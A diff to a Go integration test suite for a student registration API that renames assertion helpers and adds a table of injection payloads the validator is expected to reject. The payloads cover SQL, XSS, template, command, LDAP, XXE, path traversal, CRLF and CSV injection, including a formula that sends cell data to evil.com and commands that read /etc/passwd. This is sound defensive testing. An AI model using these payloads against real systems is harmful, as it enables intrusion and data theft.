@@ -1,6 +1,7 @@
 package commands
 
 import (
+	"fmt"
 	"net/http"
 	"strings"
 	"sync"
@@ -43,9 +44,9 @@ func (s *RegistrationIntegrationSuite) TestStudentRegistrationFlow() {
 	var reg *db.RegistrationAssertion
 	s.T().Run("Verify Registration", func(t *testing.T) {
 		reg = s.DB.RequireRegistrationExists(t, email).
-			HasStatus(registration.StatusPending).
-			HasVerificationCode().
-			IsNotExpired()
+			AssertStatus(registration.StatusPending).
+			AssertVerificationCode().
+			AssertIsNotExpired()
 	})
 
 	var e *registration.RegistrationStarted
@@ -96,11 +97,11 @@ func (s *RegistrationIntegrationSuite) TestStudentRegistrationFlow() {
 		}, 5*time.Second, 100*time.Millisecond, "Student should be created within 5 seconds")
 
 		s.DB.RequireUserExists(t, email).
-			HasRole(role.Student).
-			HasFullName(fixtures.TestStudent.FirstName, fixtures.TestStudent.LastName).
-			IsStudent().
-			InGroupID(fixtures.SEGroup.ID).
-			HasMajor(fixtures.SEGroup.Major.String())
+			AssertRole(role.Student).
+			AssertFullName(fixtures.TestStudent.FirstName, fixtures.TestStudent.LastName).
+			AssertIsStudent().
+			AssertInGroupID(fixtures.SEGroup.ID).
+			AssertMajor(fixtures.SEGroup.Major.String())
 	})
 
 	s.T().Run("Verify Registration Status", func(t *testing.T) {
@@ -263,8 +264,8 @@ func (s *RegistrationIntegrationSuite) TestVerificationCodeHandling() {
 			AssertStatus(http.StatusTooManyRequests)
 
 		s.DB.RequireRegistrationExists(t, email).
-			HasStatus(registration.StatusExpired).
-			HasCodeAttempts(3)
+			AssertStatus(registration.StatusExpired).
+			AssertCodeAttempts(3)
 	})
 
 	s.T().Run("Verify Already Expired Code", func(t *testing.T) {
@@ -878,13 +879,493 @@ func (s *RegistrationIntegrationSuite) TestRegistration_StudentComplete_Security
 	}
 }
 
+func (s *RegistrationIntegrationSuite) TestRegistration_AdvancedInjectionVectors() {
+	s.DB.SeedGroup(s.T(), fixtures.SEGroup.ID, fixtures.SEGroup.Name, fixtures.SEGroup.Year, fixtures.SEGroup.Major)
+
+	// Modern and comprehensive injection test vectors
+	tests := []struct {
+		name            string
+		setup           func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody)
+		expectedStatus  int
+		expectedMessage string
+		description     string
+		setupBefore     bool
+		assertFunc      func(t *testing.T, u *db.UserAssertion)
+	}{
+		// Advanced SQL Injection Variants
+		{
+			name: "Blind SQL Injection with Time Delay",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.Email = "test@test.com'; WAITFOR DELAY '00:00:05'--"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "Email Address must be a valid email address",
+			description:     "Time-based blind SQL injection attempt",
+		},
+		{
+			name: "Union-based SQL Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "John' UNION SELECT username, password FROM users--"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Union-based SQL injection to extract data",
+		},
+		{
+			name: "Stacked Queries SQL Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.LastName = "Smith'; INSERT INTO users (email, role) VALUES ('hacker@evil.com', 'admin')--"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Stacked queries injection",
+		},
+		{
+			name:        "Second Order SQL Injection",
+			description: "Second order SQL injection payload, must be sanitized on database level",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "admin'--"
+			},
+			expectedStatus: http.StatusOK,
+			setupBefore:    true,
+			assertFunc: func(t *testing.T, u *db.UserAssertion) {
+				u.AssertFirstName("admin'--")
+			},
+		},
+		{
+			name: "PostgreSQL Specific SQL Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.Barcode = "STU001'||pg_sleep(5)||'"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "Barcode must contain English letters and digits only",
+			description:     "PostgreSQL specific time-based injection",
+		},
+
+		// NoSQL Injection Patterns
+		{
+			name: "MongoDB NoSQL Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.Email = "{\"$ne\":null}@test.com"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "Email Address must be a valid email address",
+			description:     "MongoDB query operator injection",
+		},
+		{
+			name: "JSON NoSQL Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "{\"$gt\":\"\"}"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "JSON-based NoSQL injection",
+		},
+
+		// Advanced XSS Variants
+		{
+			name: "DOM-based XSS with Event Handler",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "<div onmouseover=\"alert(document.cookie)\">Name</div>"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "DOM XSS with mouse event",
+		},
+		{
+			name: "XSS with SVG Payload",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.LastName = "<svg onload=alert('XSS')>"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "SVG-based XSS vector",
+		},
+		{
+			name: "XSS with Data URI",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "<a href=\"data:text/html,<script>alert('XSS')</script>\">Click</a>"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Data URI XSS attempt",
+		},
+		{
+			name: "Polyglot XSS Payload",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.LastName = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Polyglot payload working in multiple contexts",
+		},
+		{
+			name: "XSS with JavaScript Protocol",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "javascript:alert(1)"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "JavaScript protocol handler",
+		},
+
+		// Template Injection
+		{
+			name: "Server-Side Template Injection (SSTI)",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "{{7*7}}"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Basic SSTI payload",
+		},
+		{
+			name: "Jinja2 Template Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.LastName = "{{ config.items() }}"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Jinja2 specific template injection",
+		},
+
+		// Command Injection
+		{
+			name: "OS Command Injection with Semicolon",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.Barcode = "STU001;cat /etc/passwd"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "Barcode must contain English letters and digits only",
+			description:     "Command injection with semicolon",
+		},
+		{
+			name: "Command Injection with Backticks",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "`whoami`"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Command substitution with backticks",
+		},
+		{
+			name: "Command Injection with Pipe",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.Barcode = "STU001|id"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "Barcode must contain English letters and digits only",
+			description:     "Command chaining with pipe",
+		},
+
+		// LDAP Injection
+		{
+			name: "LDAP Injection with Wildcard",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.Email = "*)(uid=*))(|(uid=*@test.com"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "Email Address must be a valid email address",
+			description:     "LDAP filter injection",
+		},
+		{
+			name: "LDAP Injection with Boolean Logic",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "admin)(|(password=*"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "LDAP boolean injection",
+		},
+
+		// Path Traversal
+		{
+			name: "Path Traversal with Dot Dot Slash",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "../../../etc/passwd"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Directory traversal attempt",
+		},
+		{
+			name: "Path Traversal with URL Encoding",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.LastName = "..%2F..%2F..%2Fetc%2Fpasswd"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "URL encoded path traversal",
+		},
+		{
+			name: "Path Traversal with Double Encoding",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "..%252f..%252f..%252fetc%252fpasswd"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Double URL encoded traversal",
+		},
+
+		// Unicode and Encoding Attacks
+		{
+			name: "Unicode Normalization Bypass",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "ＡＤＭİＮ" // Full-width and Turkish i
+			},
+			expectedStatus: http.StatusOK,
+			setupBefore:    true,
+			description:    "Unicode normalization bypass",
+			assertFunc: func(t *testing.T, u *db.UserAssertion) {
+				u.AssertFirstName("ＡＤＭİＮ")
+			},
+		},
+		{
+			name: "Homograph Attack with Cyrillic",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.Email = "аdmin@test.com" // Cyrillic 'а' instead of Latin 'a'
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "Email Address must be a valid email address",
+			description:     "IDN homograph attack",
+		},
+		{
+			name: "Zero-Width Characters Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "John\u200B\u200CSmith" // Zero-width space and non-joiner
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Zero-width character injection",
+		},
+		{
+			name: "UTF-8 Overlong Encoding",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.Barcode = "STU\xc0\xbc001" // Overlong encoding
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "Barcode must contain English letters and digits only",
+			description:     "UTF-8 overlong encoding attack",
+		},
+
+		// CSV Injection
+		{
+			name: "CSV Formula Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "=1+1+cmd|'/c calc'!A1"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "CSV formula injection",
+		},
+		{
+			name: "CSV Injection with HYPERLINK",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.LastName = "=HYPERLINK(\"http://evil.com?data=\"&A1&A2,\"Click\")"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "CSV injection with hyperlink",
+		},
+
+		// XML/XXE Injection
+		{
+			name: "XXE Attack Payload",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "XML External Entity attack",
+		},
+		{
+			name: "XML Bomb (Billion Laughs)",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.LastName = "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]>"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "XML bomb DoS attack",
+		},
+
+		// Header Injection
+		{
+			name: "CRLF Injection in Email",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.Email = "test@test.com\r\nBcc:attacker@evil.com"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "Email Address must be a valid email address",
+			description:     "CRLF injection for header manipulation",
+		},
+		{
+			name: "HTTP Response Splitting",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "John\r\n\r\n<script>alert(1)</script>"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "HTTP response splitting attempt",
+		},
+
+		// JSON Injection
+		{
+			name: "JSON Structure Breaking",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "\",\"role\":\"admin\",\"name\":\""
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "JSON structure manipulation",
+		},
+		{
+			name: "JSON Unicode Escape Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.LastName = "\\u0022,\\u0022role\\u0022:\\u0022admin\\u0022"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "JSON with unicode escapes",
+		},
+
+		// Regular Expression DoS (ReDoS)
+		{
+			name: "ReDoS Attack Pattern",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.Email = strings.Repeat("a", 50) + strings.Repeat("a!", 50) + "@test.com"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "Email Address must be a valid email address",
+			description:     "Regex denial of service pattern",
+		},
+
+		// Format String Attack
+		{
+			name: "Format String Vulnerability",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "%s%s%s%s%s%s%s%s%s%s"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Format string attack",
+		},
+		{
+			name: "Printf Format Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.LastName = "%x %x %x %x"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Printf format string injection",
+		},
+
+		// Business Logic Bypass Attempts
+		{
+			name: "Case Variation Bypass",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "aDmIn"
+			},
+			expectedStatus: http.StatusOK,
+			setupBefore:    true,
+			description:    "Case variation for bypass attempts",
+		},
+		{
+			name: "Negative Number Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.VerificationCode = "-1"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "Verification Code",
+			description:     "Negative number for integer fields",
+		},
+		{
+			name: "Emoji Injection",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "John😀Smith"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Emoji characters in name fields",
+		},
+		{
+			name: "Right-to-Left Override",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.LastName = "Smith\u202Etxt.exe" // RLO character
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Right-to-left override character",
+		},
+		{
+			name: "Name with Numbers",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "John123"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Numbers in names should be rejected",
+		},
+		{
+			name: "Name with HTML Tags",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "<script>alert('xss')</script>"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "HTML tags should be rejected",
+		},
+		{
+			name: "Name with Special Symbols",
+			setup: func(req *registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody) {
+				req.FirstName = "John@#$%"
+			},
+			expectedStatus:  http.StatusBadRequest,
+			expectedMessage: "must be a valid name",
+			description:     "Special symbols should be rejected",
+		},
+	}
+
+	for _, tt := range tests {
+		s.T().Run(tt.name, func(t *testing.T) {
+			request := registrationhttp.PostV1RegistrationsStudentsCompleteJSONRequestBody{
+				Email:            fixtures.TestStudent.Email,
+				VerificationCode: "123456",
+				Password:         fixtures.TestStudent.Password,
+				Barcode:          fixtures.TestStudent.Barcode,
+				FirstName:        fixtures.TestStudent.FirstName,
+				LastName:         fixtures.TestStudent.LastName,
+				GroupId:          fixtures.SEGroup.ID,
+			}
+
+			if tt.setupBefore {
+				uniqueEmail := fmt.Sprintf("test-%d-%s@test.com", time.Now().UnixNano(), strings.ReplaceAll(tt.name, " ", "-"))
+				request.Email = uniqueEmail
+				s.setupVerifiedRegistration(uniqueEmail)
+				request.VerificationCode = s.getVerificationCode(uniqueEmail)
+				// length is 6, rundomly generated
+				request.Barcode = fmt.Sprintf("SE%06d", time.Now().UnixNano()%1000000)
+			}
+
+			tt.setup(&request)
+			response := s.HTTP.CompleteStudentRegistration(t, request)
+			response.AssertStatus(tt.expectedStatus)
+			if tt.expectedMessage != "" {
+				response.AssertContainsMessage(tt.expectedMessage)
+			}
+			if tt.assertFunc != nil {
+				tt.assertFunc(t, s.DB.RequireUserExists(t, request.Email))
+			}
+		})
+	}
+}
+
 func (s *RegistrationIntegrationSuite) setupVerifiedRegistration(email string) {
 	if !s.DB.CheckGroupExists(s.T(), fixtures.SEGroup.ID) {
 		s.DB.SeedGroup(s.T(), fixtures.SEGroup.ID, fixtures.SEGroup.Name, fixtures.SEGroup.Year, fixtures.SEGroup.Major)
 	}
-	s.HTTP.StartStudentRegistration(s.T(), email).AssertAccepted()
+	s.HTTP.StartStudentRegistration(s.T(), email).RequireAccepted()
 	reg := s.DB.RequireRegistrationExists(s.T(), email)
-	s.HTTP.VerifyRegistrationCode(s.T(), email, reg.GetVerificationCode()).AssertSuccess()
+	s.HTTP.VerifyRegistrationCode(s.T(), email, reg.GetVerificationCode()).RequireSuccess()
 }
 
 func (s *RegistrationIntegrationSuite) setupCompletedRegistration(email string) {
